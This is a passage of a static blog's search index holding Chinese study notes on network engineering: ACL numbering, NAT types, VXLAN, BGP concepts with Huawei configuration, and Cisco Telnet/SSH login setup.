<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ACL</title>
      <link href="/2022/05/05/ACL/"/>
      <url>/2022/05/05/ACL/</url>
      
        <content type="html"><![CDATA[<p>思科：<br>标准ACL：传统的标准ACL 1-99,1300-1999<br>扩展ACL： 100-199,2000-2699<br>命名标准ACL：ip access-list standry acl_name 回车<br>命名扩展ACL： ipaccess-list extended acl_name 回车</p><p>华为：<br>接口ACL：1000-1999</p><p>基本ACL：2000-2999</p><p>高级ACL：数字型高级ACL：3000-3999<br>                命名型高级ACl：42768-75535           （32768个）</p><p>二层数据帧访问控制列表：4000-4999<br>自定义ACL（编号5000-5999）<br>用户ACL：6000-6031</p>]]></content>
      
      
      <categories>
          
          <category> ACL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nat</title>
      <link href="/2022/05/05/nat/"/>
      <url>/2022/05/05/nat/</url>
      
        <content type="html"><![CDATA[<p>网络地址转换技术</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="源NAT（源IP地址转换）"><a href="#源NAT（源IP地址转换）" class="headerlink" title="源NAT（源IP地址转换）"></a>源NAT（源IP地址转换）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Easy-IP：出接口地址转换，转换后的IP地址只能为出接口IP地址</span><br><span class="line">NAPT：网络地址和端口转换，通过端口区分用户</span><br><span class="line">No-PAT：只转换IP地址，不转换端口，需要知道NAT地址池，<span class="number">100</span>个内网用户需要<span class="number">100</span>个公网IP</span><br></pre></td></tr></table></figure><h3 id="目的NAT（目的IP地址转换）"><a href="#目的NAT（目的IP地址转换）" class="headerlink" title="目的NAT（目的IP地址转换）"></a>目的NAT（目的IP地址转换）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">静态目的NAT：转换报文目的IP地址，转换后的地址存在一种固定的映射关系</span><br><span class="line">动态目的NAT：动态转换报文目的IP地址，转换前后的地址不存在一种固定的映射关系</span><br><span class="line">NAT Server：一种特殊的静态目的NAT，内外IP:端口 映射到 外网IP:端口</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> nat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vxlan</title>
      <link href="/2022/05/03/Vxlan/"/>
      <url>/2022/05/03/Vxlan/</url>
      
        <content type="html"><![CDATA[<h2 id="Vxlan概念"><a href="#Vxlan概念" class="headerlink" title="Vxlan概念"></a>Vxlan概念</h2><p>VXLAN（Virtual extensible local area network,虚拟可扩展局域网），是一种虚拟化隧道通信技术。它是一种Overlay（覆盖网络）技术，通过三层的网络来搭建虚拟的二层网络！！！！！</p><p>VXLAN是在底层物理网络（underlay）之上使用的隧道技术，借助UDP层构建的Overlay的逻辑网络，使逻辑网络与物理网络解耦，实现灵活组网需求。它对原有的网络架构几乎没有影响，不需要对原网络做任何改动，即可架设一层新的网络。</p><p>VXLAN 的报文 Header 预留了 <code>24 bit</code> 来标识不同的二层网络。可以支持2^24个子网。</p><h3 id="Overlay技术"><a href="#Overlay技术" class="headerlink" title="Overlay技术"></a>Overlay技术</h3><p>Overlay在网络技术领域，指的是一种网络架构上叠加的虚拟化技术模式，，其大体框架是对基础网络不进行大规模修改的条件下，实现应用在网络上的承载，并能与其它网络业务分离，并且以基于 IP 的基础网络技术为主。</p><p>IETF 在 <code>Overlay</code> 技术领域提出 <code>VXLAN</code>、<code>NVGRE</code>、<code>STT</code> 三大技术方案。大体思路均是将以太网报文承载到某种隧道层面，差异性在于选择和构造隧道的不同，而底层均是 IP 转发。</p><h3 id="常见术语"><a href="#常见术语" class="headerlink" title="常见术语"></a>常见术语</h3><h4 id="VTEP（vxlan-tunel-endpoints，vxlan隧道端点）"><a href="#VTEP（vxlan-tunel-endpoints，vxlan隧道端点）" class="headerlink" title="VTEP（vxlan tunel endpoints，vxlan隧道端点）"></a>VTEP（vxlan tunel endpoints，vxlan隧道端点）</h4><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">vxlan网络的边缘设备，用来进行vxlan报文的处理（封包和解包）。vtep可以是网络设备（如交换机），也可以是一台机器（虚拟化集群中的宿主机）。</span></span><br></pre></td></tr></table></figure><h4 id="VNI（vxlan-network-identify，vxlan网络标识符）"><a href="#VNI（vxlan-network-identify，vxlan网络标识符）" class="headerlink" title="VNI（vxlan network identify，vxlan网络标识符）"></a>VNI（vxlan network identify，vxlan网络标识符）</h4><p>vni是每个vxlan段的标识，是个24位整数，共有2^24=16777216(一千多万)，一般每个vni对应一个租户，也就是说使用 <code>VXLAN</code> 搭建的公有云可以理论上可以支撑千万级别的租户。</p><h4 id="Tunnel（vxlan-隧道）"><a href="#Tunnel（vxlan-隧道）" class="headerlink" title="Tunnel（vxlan 隧道）"></a>Tunnel（vxlan 隧道）</h4><p>隧道是一个逻辑上的概念，在 VXLAN 模型中并没有具体的物理实体向对应。隧道可以看做是一种虚拟通道，VXLAN 通信双方认为自己是在直接通信，并不知道底层网络的存在。</p>]]></content>
      
      
      <categories>
          
          <category> Vxlan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vxlan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bgp</title>
      <link href="/2022/04/20/bgp/"/>
      <url>/2022/04/20/bgp/</url>
      
        <content type="html"><![CDATA[<h2 id="BGP产生"><a href="#BGP产生" class="headerlink" title="BGP产生"></a>BGP产生</h2><p>网络被分为不同AS（自治系统）。早期，EGP（外部网关协议）被用于实现在AS之间多态交换路由信息。但是没有考虑环路避免等问题，很快无法满足网络管理的要求。</p><p>BGP是为取代EGP而设计的另一种外部网关协议。不同于早期的EGP，BGP能够进行路由优选、避免路由环路、更高效率的传递路由和维护大量的路由信息。</p><p>任何一条BGP路由都拥有多个路径属性，当路由器通告BGP路由给它的对等体时，该路由将会携带多个路径属性，这些属性描述了BGP路由的各项特征，同时在某些场景下也会影响BGP路由优选的决策。</p><p>AS之间使用IGP传递路由：</p><p><img src="/img/bgp/bgp1.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AS之间需要直连链路，或通过VPN协议构造逻辑直连进行邻居建立。</span><br><span class="line">AS之间可能是不同的机构、公司，相互之间无法完全信任，使用IGP可能存在暴露AS内部的网络信息的风险。</span><br><span class="line">整个网络的扩大，路由数量进一步增加，路由表规模变大，路由收敛变慢，设备性能消耗加大。</span><br></pre></td></tr></table></figure><p>AS之间使用BGP传递路由</p><p><img src="/img/bgp/bgp2.jpg"></p><p>在AS之间专门使用BGP协议（边界网关协议）进行路由传递，相较于传统的IGP协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BGP基于TCP，只要能够建立TCP连接即可建立BGP。</span><br><span class="line">只传递路由信息，不会暴露AS内部信息。</span><br><span class="line">触发式更新，而不是进行周期性更新。</span><br></pre></td></tr></table></figure><h2 id="BGP概述"><a href="#BGP概述" class="headerlink" title="BGP概述"></a>BGP概述</h2><p>BGP是一种实现自治系统AS之间的路由可达性，并选择最佳路由的矢量性协议。早期发布的三个版本分别是BGP-1(RFC1105)、BGP-2(RFC1163)、BGP-3(RFC1267)，1994年开始使用BGP-4(RFC1771)，2006年之后单播IPv4网络使用的版本是BGP-4(RFC4271)，其他网络(如IPv6)使用的版本是MP-BGP(RFC4760)。</p><h3 id="BGP特点："><a href="#BGP特点：" class="headerlink" title="BGP特点："></a>BGP特点：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BGP使用TCP作为其传输层协议，（端口号为179），使用触发式路由更新，而不是周期性路由更新。</span><br><span class="line">BGP能够承载大批量的路由信息，能够支撑大规模网络。</span><br><span class="line">BGP提供了丰富的路由策略，能够灵活的进行路由选择，并能指导对等体按策略发布路由。</span><br><span class="line">BGP能够支撑MPLS/VPN的应用，传递客户VPN路由。</span><br><span class="line">BGP提供了路由聚合和路由衰减功能用于防止路由振荡，通过这两项功能有效地提高了网络稳定性。</span><br></pre></td></tr></table></figure><h3 id="BGP特征1："><a href="#BGP特征1：" class="headerlink" title="BGP特征1："></a>BGP特征1：</h3><p><img src="/img/bgp/bgp3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BGP使用TCP为传输层协议，TCP端口号为179。路由器之间的BGP会话基于TCP连接而建立。</span><br><span class="line">运行BGP的路由器被称为BGP发言者（BGP Speaker），或BGP路由器。</span><br><span class="line">两个建立BGP会话的路由器互为对等体（Peer），BGP对等体之间交换BGP路由表。</span><br><span class="line">BGP路由器只发送增量的BGP路由更新，或进行触发式更新（不会周期性更新）。</span><br><span class="line">BGP能够承载大批量的路由前缀，可在大规模网络中应用。</span><br></pre></td></tr></table></figure><h3 id="BGP特征2："><a href="#BGP特征2：" class="headerlink" title="BGP特征2："></a>BGP特征2：</h3><p><img src="/img/bgp/bgp4.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BGP通常被称为路径实例路由协议（Path-Vector Routing Protocol）。</span><br><span class="line">每条BGP路由都携带多种路径属性（Path attribute），BGP可以通过这些路径属性控制路径选择，而不像IS-IS、OSPF只通过Cost控制路径选择，因此在路径选择上，BGP具有丰富的可操作性，可以在不同场景下选择最合适的路径控制方式。</span><br></pre></td></tr></table></figure><h2 id="BGP基本概念"><a href="#BGP基本概念" class="headerlink" title="BGP基本概念"></a>BGP基本概念</h2><h3 id="AS："><a href="#AS：" class="headerlink" title="AS："></a>AS：</h3><p>OSPF、IS-IS等IGP路由协议在组织机构网络内部广泛应用，随着网络规模扩大，网络中路由数量不断增长，IGP已无法管理大规模网络，AS概念由此诞生。</p><p>AS（自治系统）指的是在同一个组织管理下，使用统一选路策略的设备集合。</p><p>不同AS通过AS号区分，AS号存在16bit、32bit两种表示方式。IANA负责AS号的分发。</p><h3 id="BGP对等关系"><a href="#BGP对等关系" class="headerlink" title="BGP对等关系"></a>BGP对等关系</h3><p>与OSPF、IS-IS等协议不同，BGP的会话是基于TCP建立的。建立BGP对等体关系的两台路由器并不要求必须直连。</p><p>BGP存在两种对等体关系类型：EBGP和IBGP</p><p><img src="/img/bgp/bgp5.jpg"></p><p>EBGP（External BGP）：位于不同自治系统的BGP路由器之间的BGP对等关系。两台路由器之间要建立EBGP对等关系，必须满足两个条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、两个路由器所属AS不同（即AS号不同）</span><br><span class="line">2、在配置EBGP时，Peer命令所指定的对等体IP地址要求路由可达，并且TCP连接能够正确建立。</span><br></pre></td></tr></table></figure><p>IBGP（Internal BGP）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">位于相同自治系统的BGP路由器之间的BGP邻接关系。</span><br></pre></td></tr></table></figure><h3 id="BGP对等体关系建立1"><a href="#BGP对等体关系建立1" class="headerlink" title="BGP对等体关系建立1"></a>BGP对等体关系建立1</h3><p> 先启动BGP的一端发起TCP连接，如图所示，R1先启动BGP，R1使用随机端口号向R2的179端口发起连接，完成TCP连接的建立。</p><p>三次握手建立完成之后，R1、R2之间相互发送Open报文，携带参数用于对等体建立，参数协商正常之后双方相互发送Keepalive报文，收到对端发送的Keepalive报文之后对等体建立连接成功，同时双方定期发送Keepalive报文用于保持连接。</p><p> <img src="/img/bgp/bgp6.jpg"></p><p>其中Open报文中携带：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">My Autonomous System：自身AS号</span><br><span class="line">Hold Time：用于协商后续Keepalive报文发送时间</span><br><span class="line">BGP Identifiter：自身Router ID</span><br></pre></td></tr></table></figure><h3 id="BGP对等体关系建立2"><a href="#BGP对等体关系建立2" class="headerlink" title="BGP对等体关系建立2"></a>BGP对等体关系建立2</h3><p>BGP对等体关系建立之后，BGP路由器发送BGP Update（更新）报文通告路由到对等体。</p><p><img src="/img/bgp/bgp7.jpg"></p><h3 id="TCP连接源地址"><a href="#TCP连接源地址" class="headerlink" title="TCP连接源地址"></a>TCP连接源地址</h3><p>缺省情况下，BGP使用报文出接口作为TCP连接的本地连接口。</p><p><img src="/img/bgp/bgp8.jpg"></p><p>在部署BGP对等体关系时，建议使用Loopback地址作为更新源地址。Loopback接口非常稳定，而且可以借助AS号的内部IGP和冗余拓扑来保证可靠性。</p><p>在部署EBGP对等体关系时，通常使用直连接口的IP地址作为源地址，如若使用Loopback接口建立EBGP对等体关系，则应注意EBGP多跳问题。</p><h2 id="BGP报文类型"><a href="#BGP报文类型" class="headerlink" title="BGP报文类型"></a>BGP报文类型</h2><table><thead><tr><th>报文名称</th><th>作用</th><th>发送时刻</th></tr></thead><tbody><tr><td>Open</td><td>协商BGP对等体参数，建立对等体关系</td><td>BGP TCP连接建立成功之后</td></tr><tr><td>Update</td><td>发送BGP路由更新</td><td>BGP对等体关系建立之后有路由需要发送或路由变化时向对等体发送Update报文</td></tr><tr><td>Notifiction</td><td>报告错误信息，中止对等体关系</td><td>当BGP在运行中发现错误时，发送Notifiction报文将错误通告给BGP对等体</td></tr><tr><td>Keepalive</td><td>标志对等体建立，维持BGP对等体关系</td><td>BGP路由器收到对端发送的Keepalive报文，将对等体状态置为已建立，同时后续定期发送Keepalive报文用于保持连接</td></tr><tr><td>Route-refresh</td><td>用于在改变路由策略后请求对等体重新发送路由信息。只有支持路由刷新能力的BGP设备会发送和响应报文。</td><td>当路由策略发送变化时，触发请求对等体重新通告路由</td></tr></tbody></table><h2 id="BGP状态机"><a href="#BGP状态机" class="headerlink" title="BGP状态机"></a>BGP状态机</h2><table><thead><tr><th>Peer状态名称</th><th>用途</th></tr></thead><tbody><tr><td>Idle</td><td>开始准备TCP的连接并监视远程对等体，启用BGP时，要准备足够的资源</td></tr><tr><td>Connect</td><td>正在进行TCP连接，等待完成中，认证都是在TCP建立期间完成，如果TCP连接建立失败则进入Active状态，反复尝试连接</td></tr><tr><td>Active</td><td>TCP建立没用成功，反复尝试TCP连接</td></tr><tr><td>OpenSent</td><td>TCP连接建立成功，开始发送Open包，Open包携带参数协商对等体的建立</td></tr><tr><td>OpenConfirm</td><td>参数、能力特性协商成功，自己发送Keepalive包，等待对方的Keepalive包</td></tr><tr><td>Established</td><td>已经收到对方的Keepalive包，双方能力特性经协商发现一致，并开始使用Update通告路由信息</td></tr></tbody></table><p><img src="/img/ngp/bgp9.jpg"></p><h2 id="BGP对等体表"><a href="#BGP对等体表" class="headerlink" title="BGP对等体表"></a>BGP对等体表</h2><blockquote><p>display bgp peer</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Peer：对等体地址</span><br><span class="line">V：version，版本号</span><br><span class="line">AS：对等体AS号</span><br><span class="line">Up/Down：该对等体已经存在up或者down的时间</span><br><span class="line">State：对等体状态，这里显示的为BGP状态机的状态</span><br><span class="line">Prefrcv：prefix received，从该对等体收到的路由前缀数目</span><br></pre></td></tr></table></figure><h2 id="BGP路由表"><a href="#BGP路由表" class="headerlink" title="BGP路由表"></a>BGP路由表</h2><blockquote><p>display peer routing-table</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Network：路由的目的网络地址以及网络掩码</span><br><span class="line">NextHop：下一跳地址</span><br></pre></td></tr></table></figure><h2 id="BGP路由的生成"><a href="#BGP路由的生成" class="headerlink" title="BGP路由的生成"></a>BGP路由的生成</h2><p><img src="/img/bgp/bgp10.jpg"></p><p>不同于IGP路由协议，BGP自身并不会发现计算产生路由，BGP将IGP路由表中的路由注入到BGP路由表中，并通过Update报文传递给BGP对等体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BGP注入路由的方式有两种：</span><br><span class="line">1、Network</span><br><span class="line">2、import-route</span><br></pre></td></tr></table></figure><p>与IGP协议相同，BGP支持根据已有的路由条目进行聚合，生成聚合路由。</p><h3 id="Network注入路由"><a href="#Network注入路由" class="headerlink" title="Network注入路由"></a>Network注入路由</h3><p><img src="/img/bgp/bgp11.jpg"></p><p>AS200内的路由器已经通过IGP协议OSPF学习到了两条路由：10.1.0.0/24和10.2.0.0/24，在BGP进程内通过network命令注入这两条路由，这两天路由将会出现在本地的BGP路由表中。</p><p><img src="/img/bgp/bgp12.jpg"></p><p>AS200内的BGP路由通过Update报文将路由传递给AS300内的BGP路由器。</p><p>AS300内的BGP路由器收到路由后，将这两条路由加入到本地的路由表中。</p><h3 id="import-route方式注入路由"><a href="#import-route方式注入路由" class="headerlink" title="import-route方式注入路由"></a>import-route方式注入路由</h3><p><img src="/img/bgp/bgp13.jpg"></p><p>Network方式注入路由虽然是精确注入，但是只能一条条配置逐条注入IP路由表中的路由，如果注入的路由条目很多配置命令将会非常复杂，为此可以使用import-route方式，将：</p><p>1、直连路由</p><p>2、静态路由</p><p>3、OSPF路由</p><p>4、IS-IS路由</p><p>等协议的路由注入到BGP路由表中。</p><h2 id="BGP聚合路由"><a href="#BGP聚合路由" class="headerlink" title="BGP聚合路由"></a>BGP聚合路由</h2><p><img src="/img/bgp/bgp14.jpg"></p><p>与众多IGP协议相同，BGP同样支持路由的手工聚合，在BGP配置视图中使用aggregate命令可以执行BGP路由手工聚合，在BGP已经学习到相应的明细路由情况下，设备会向BGP注入指定的聚合路由。</p><h3 id="通告原则"><a href="#通告原则" class="headerlink" title="通告原则"></a>通告原则</h3><p>BGP通告network、import-route、aggregate聚合方式生成BGP路由后，通过Update报文将BGP路由传递给对等体。</p><p>BGP通告遵循以下原则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">只发布最有且有效路由。</span><br><span class="line">从EBGP对等体获取的路由，会发布给所有对等体。</span><br><span class="line">IBDP水平分割：从IBGP对等体获取的路由，不会发送给IBGP对等体。</span><br></pre></td></tr></table></figure><h2 id="BGP的基本配置"><a href="#BGP的基本配置" class="headerlink" title="BGP的基本配置"></a>BGP的基本配置</h2><p>案例：</p><p><img src="/img/bgp/bgp15.jpg"></p><p>1、启动BGP进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Huawei]bgp &#123;as-number-plain | as-number-dot&#125;</span><br><span class="line">[Huawei-bgp]router-id ipv4-address</span><br><span class="line">启动BGP，指定本地AS编号，并进入BGP视图。使用router-id命令配置BGP的Router ID，建议将Router ID配置为设备Loopback接口的地址。</span><br><span class="line">案例：</span><br><span class="line">[R1]bgp 100</span><br><span class="line">[R1-bgp]router-id 10.0.1.1</span><br></pre></td></tr></table></figure><p>2、配置BGP对等体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Huawei-bgp]peer &#123;ipv4-address | ipv6-address&#125; as-number &#123;as-number-plain | as-number-dot&#125;</span><br><span class="line">创建BGP对等体，指定对等体地址以及AS号</span><br><span class="line">案例：</span><br><span class="line">[R1-bgp]peer 10.0.3.3 as-number 100</span><br></pre></td></tr></table></figure><p>3、配置建立对等体使用的源地址、EBGP对等体最大跳数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Huawei-bgp]peer ipv4-address connect-interface interface-type interface-number [ipv4-source-address]</span><br><span class="line">[Huawei-bgp]peer ipv4-address ebgp-max-hop [hop-count]</span><br><span class="line">指定发送BGP报文的原接口，并可指定发起连接时使用的源地址。</span><br><span class="line">指定建立EBGP连接允许的最大跳数。缺省情况下，EBGP连接允许的最大跳数为1，即只能在物理直连链路上建立EBGP连接。</span><br><span class="line">案例：</span><br><span class="line">[R1-bgp]peer 10.0.3.3 connect-interface LoopBack1</span><br><span class="line">[R3]bgp 100</span><br><span class="line">[R3-bgp]router-id 10.0.3.3</span><br><span class="line">[R3-bgp]peer 10.0.1.1 as-number 100</span><br><span class="line">[R3-bgp]peer 10.0.1.1 connect-interface LoopBack1</span><br><span class="line">[R3-bgp]peer 10.0.34.4 as-number 200</span><br></pre></td></tr></table></figure><h2 id="BGP路由的路径属性分类"><a href="#BGP路由的路径属性分类" class="headerlink" title="BGP路由的路径属性分类"></a>BGP路由的路径属性分类</h2><p>公认必遵：Origin、AS_Path\Next_hop</p><p>公认任意：Local_Preference\Atomic_aggregate</p><p>可选过渡：Aggregate\Community</p><p>可选非过渡：MED、Cluster-List、Originator-ID</p><p>公认属性是所有BGP路由器都必须能够识别的属性</p><p>公认属性分两类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">公认必遵：必须包括在每个Update消息里。</span><br><span class="line">公认任意：可能包括在某些Update消息里。</span><br></pre></td></tr></table></figure><p>可选属性不需要都被BGP路由器所识别</p><p>可选属性可以分为两类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可选过渡：BGP设备不识别此类属性依然会接受该类属性并通告给其他对等体。</span><br><span class="line">可选非过度：BGP设备不识别此类属性会忽略该属性，且不会通告给其他对等体。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BGP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BGP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交换机和路由器console口和远程登录</title>
      <link href="/2022/02/25/telnet%E5%92%8Cssh/"/>
      <url>/2022/02/25/telnet%E5%92%8Cssh/</url>
      
        <content type="html"><![CDATA[<p>出于安全性考虑，思科交换机上如果配置了Telnet或SSH远程服务，就必须同时配置特权模式的密码，不管是无认证方式登录还是有认证方式下都需要配置，否则登录到命令行后只能进入用户模式，进入特权模式时会提示“No password set”</p><h2 id="TELNET"><a href="#TELNET" class="headerlink" title="TELNET"></a>TELNET</h2><h3 id="交换机能够通过-Telnet-登录的条件"><a href="#交换机能够通过-Telnet-登录的条件" class="headerlink" title="交换机能够通过 Telnet 登录的条件"></a>交换机能够通过 Telnet 登录的条件</h3><ol><li>交换机已经配置了 IP 地址；</li><li>交换机已经配置了远程登录密码；</li><li>交换机已经配置了特权密码；</li><li>交换机已经接入网络并开始工作。</li><li>交换机的 vlan 1 激活</li></ol><blockquote><p>如果登录的交换机没有配置远程登录密码,会显示错误提示信息</p></blockquote><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">“</span> <span class="string">Password</span> <span class="string">required,</span> <span class="string">but</span> <span class="string">none</span> <span class="string">set</span> <span class="string">”</span></span><br></pre></td></tr></table></figure><blockquote><p>如果没有设置特权密码，在进入特权模式时会显示 错误提示信息</p></blockquote><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">“</span> <span class="string">%Nopassword</span> <span class="string">set</span> <span class="string">”</span></span><br></pre></td></tr></table></figure><p>所以，对于一台新购置的交换机，必须先用控制台为交换机配置 IP 地址和远程登录密码，以后就可以用远程登录管理这台交换机了。</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>用控制台为交换机配置 IP 地址、远程登录密码和特权密码。远程登陆必须开启vty接口。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Switch&gt;enable</span>  <span class="string">--进入特权模式</span></span><br><span class="line"> </span><br><span class="line"><span class="string">Switch#configure</span> <span class="string">terminal</span>  <span class="string">--进入全局配置模式</span></span><br><span class="line"> </span><br><span class="line"><span class="string">Switch(config)#hostname</span> <span class="string">S1</span>  <span class="string">--修改交换机主机名为S1（方便识别）</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config)#enable</span> <span class="string">password</span> <span class="number">111</span>  <span class="string">--设置明文管理密码为111</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config)#enable</span> <span class="string">secret</span> <span class="number">222</span>  <span class="string">--设置加密密码为222（设置了加密密码后，明文将不会起作用）</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config)#line</span> <span class="string">vty</span> <span class="number">0</span> <span class="number">5</span>  <span class="string">--</span> <span class="string">设置虚拟终端个数（一般为5个，最多为16个）</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-line)#password</span> <span class="number">333</span>  <span class="string">--设置远程登录密码为333</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-line)#login</span>  <span class="string">--配置远程登录密码后必须要有login，如果没有的话则远程登录密码无效</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-line)#exit</span>  <span class="string">--返回上一级（全局配置模式）</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config)#interface</span> <span class="string">vlan</span> <span class="number">1</span>  <span class="string">--进入vlan</span> <span class="number">1</span> <span class="string">端口</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-if)#ip</span> <span class="string">address</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="string">--给vlan1配置ip地址</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-if)#no</span> <span class="string">shutdown</span>  <span class="string">--激活vlan</span> <span class="number">1</span> <span class="string">端口</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-if)#exit</span>  <span class="string">--</span> <span class="string">--返回上一级（全局配置模式）</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config)#ip</span> <span class="string">default-gateway</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.254</span>  <span class="string">--给交换机S1设置默认网关，从而达到跨网段telnet</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1(config-if)#end</span>  <span class="string">--返回特权模式</span></span><br><span class="line"> </span><br><span class="line"><span class="string">S1#copy</span> <span class="string">running-config</span> <span class="string">startup-config</span>  <span class="string">--将配置保存（从内存RAM保存到硬盘NVRAM）</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>login</th><th>不需要输入用户名，需要输入密码</th></tr></thead><tbody><tr><td>login local</td><td>需要输入用户名，需要输入密码（本地开启用户认证）</td></tr><tr><td>no login</td><td>无需输入用户名密码</td></tr></tbody></table><p>password设置的密码明文显示，secret设置的密码加密显示</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">service</span> <span class="string">password-encryption</span></span><br><span class="line"><span class="string">对show</span> <span class="string">run显示的明文密码加密（使用cisco私有算法），加密过的不处理</span></span><br></pre></td></tr></table></figure><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h2 id="创建用户和配置用户密码"><a href="#创建用户和配置用户密码" class="headerlink" title="创建用户和配置用户密码"></a>创建用户和配置用户密码</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Router(config)#username</span> <span class="string">tw</span> <span class="string">password</span> <span class="number">123</span></span><br><span class="line"><span class="string">Router(config)#username</span> <span class="string">tw</span> <span class="string">secret</span> <span class="number">123</span></span><br><span 